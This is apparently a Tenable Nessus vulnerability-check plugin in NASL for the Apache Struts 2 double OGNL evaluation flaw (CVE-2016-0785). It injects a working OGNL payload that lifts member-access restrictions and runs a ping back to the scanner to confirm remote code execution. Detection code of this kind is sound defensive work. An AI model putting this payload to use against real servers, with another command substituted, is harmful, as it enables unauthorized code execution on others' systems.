#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(90152);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2016-0785");

  script_name(english:"Apache Struts 2 Tag Attribute Double OGNL Evaluation RCE");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web application appears to use Apache Struts 2, a web
framework that utilizes OGNL (Object-Graph Navigation Language) as an
expression language. A remote code execution vulnerability exists due
to double OGNL evaluation of attribute values assigned to certain
tags. An unauthenticated, remote attacker can exploit this, via a
specially crafted request, to execute arbitrary code.

Note that this plugin only reports the first vulnerable instance of a
Struts 2 application.");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-029.html");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/version-notes-2328.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Struts version 2.3.28 or later. Alternatively, apply
the workaround referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2016-0785");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/03/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/03/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/03/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");
include("torture_cgi.inc");
include("url_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}

if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

# Always check web root
urls = make_list(urls, "/");

# Struts is slow
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;

urls = list_uniq(urls);
scanner_ip = compat::this_host();
target_ip = get_host_ip();
vuln = FALSE;

ua = get_kb_item("global_settings/http_user_agent");
if (empty_or_null(ua))
  ua = 'Nessus';

pat = hexstr(rand_str(length:10));

os = get_kb_item("Host/OS");
if (!empty_or_null(os) && "windows" >< tolower(os))
{
  ping_cmd = "ping -n 3 -l 500 " + scanner_ip;
  filter = "icmp and icmp[0] = 8 and src host " + target_ip + " and greater 500";
}
else
{
  ping_cmd = "ping -c 3 -p " + pat + " " + scanner_ip;
  filter = "icmp and icmp[0] = 8 and src host " + target_ip;
}

ping_cmd = urlencode(
  str        : ping_cmd,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                   "56789=&_."
);

foreach url (urls)
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  # Grab CGI arguments for each .action file from KB
  cgi_args = get_cgi_arg_list(port:port, cgi:url);
  if (empty_or_null(cgi_args))
  {
    url = ereg_replace(pattern:"\.(act(ion)?|jsp|do)$", string:url, replace:"");
    cgi_args = get_cgi_arg_list(port:port, cgi:url);
  }

  attack = "";
  exp_payload = "%27),%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtectedAccess%27]=true,%23_memberAccess[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23a=@java.lang.Runtime@getRuntime(),%23a.exec(%27"+ping_cmd+"%27),new%20java.lang.String(%27";

  # Build a string with CGI arguments set to the exploit string
  if (empty_or_null(cgi_args))
    attack_url = url + "?" + exp_payload;
  else
  {
    foreach arg (cgi_args)
    {
      attack += (arg + "=" + exp_payload);
    }
    attack_url = url + "?" + attack;
  }

  # Craft GET request
  get_req =
    'GET ' + attack_url + ' HTTP/1.1\n' +
    'Host: ' + target_ip + ':' + port + '\n' +
    'User-Agent: ' + ua + '\n' +
    'Accept-Language: en-US\n' +
    'Connection: Keep-Alive\n\n';

  s = send_capture(socket:soc,data:get_req,pcap_filter:filter,timeout:timeout);
  icmp = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
  close(soc);

  if ("windows" >< tolower(os) && !isnull(icmp))
  {
    vuln = TRUE;
    vuln_url = build_url(qs:attack_url, port:port);
    report =
      '\nNessus confirmed this issue by examining ICMP traffic. '+
      'Below is the response :' +
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }
  else if (pat >< icmp)
  {
    vuln = TRUE;
    vuln_url = build_url(qs:attack_url, port:port);
    report =
      '\nNessus confirmed this issue by examining ICMP traffic and looking for'+
      '\nthe pattern sent in our packet (' + pat + '). Below is the response :'+
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }

# Stop after first vulnerable Struts app is found
if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(vuln_url),
  output     : report
);
